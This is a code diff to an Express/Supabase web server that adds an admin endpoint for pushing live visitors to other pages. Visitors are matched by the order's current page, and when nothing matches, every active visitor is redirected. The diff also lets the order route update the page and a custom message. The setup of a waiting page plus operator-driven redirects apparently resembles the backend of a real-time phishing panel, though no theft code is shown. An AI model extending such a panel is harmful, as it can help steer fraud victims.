@@ -138,6 +138,48 @@ app.get('/api/visitors/active', async (req, res) => {
   }
 });
 
+// Admin redirect: set redirect_to on the order, and on matching visitor sessions
+app.post('/api/admin/redirect', async (req, res) => {
+  try {
+    if (!isAdmin(req)) return res.status(401).json({ success: false });
+    const { order_id, redirect_to } = req.body;
+    if (!order_id || !redirect_to) return res.status(400).json({ success: false });
+
+    // Get order's current_page to find the matching visitor
+    const { data: order } = await supabase.from('orders').select('current_page').eq('id', order_id).maybeSingle();
+    if (!order) return res.status(404).json({ success: false, message: 'Order not found' });
+
+    // Find active visitors on the same page as the order
+    const cutoff = Date.now() - 30000;
+    const page = (order.current_page || '').replace('-fr', '');
+    const { data: activeVisitors } = await supabase.from('visitors').select('id, current_page')
+      .gt('last_active_at', cutoff);
+
+    if (activeVisitors) {
+      const matches = activeVisitors.filter(v => {
+        const vp = (v.current_page || '').replace('-fr', '');
+        return vp === page || vp === page.replace('.html', '');
+      });
+      for (const v of matches) {
+        await supabase.from('visitors').update({ redirect_to }).eq('id', v.id);
+      }
+      // If no page match, update all active visitors as fallback
+      if (!matches.length) {
+        for (const v of activeVisitors) {
+          await supabase.from('visitors').update({ redirect_to }).eq('id', v.id);
+        }
+      }
+    }
+
+    // Also store on order
+    await supabase.from('orders').update({ redirect_to }).eq('id', order_id);
+
+    res.json({ success: true });
+  } catch (err) {
+    res.status(500).json({ success: false, message: err.message });
+  }
+});
+
 // Check order status (public - for waiting page)
 app.get('/api/orders/:id/status', async (req, res) => {
   try {
@@ -168,6 +210,8 @@ app.patch('/api/orders/:id', async (req, res) => {
     const updates = {};
     if (req.body.status) updates.status = req.body.status;
     if (req.body.redirect_to !== undefined) updates.redirect_to = req.body.redirect_to;
+    if (req.body.current_page) updates.current_page = req.body.current_page;
+    if (req.body.custom_message !== undefined) updates.custom_message = req.body.custom_message;
     const { error } = await supabase.from('orders').update(updates).eq('id', req.params.id);
     if (error) throw error;
     res.json({ success: true });
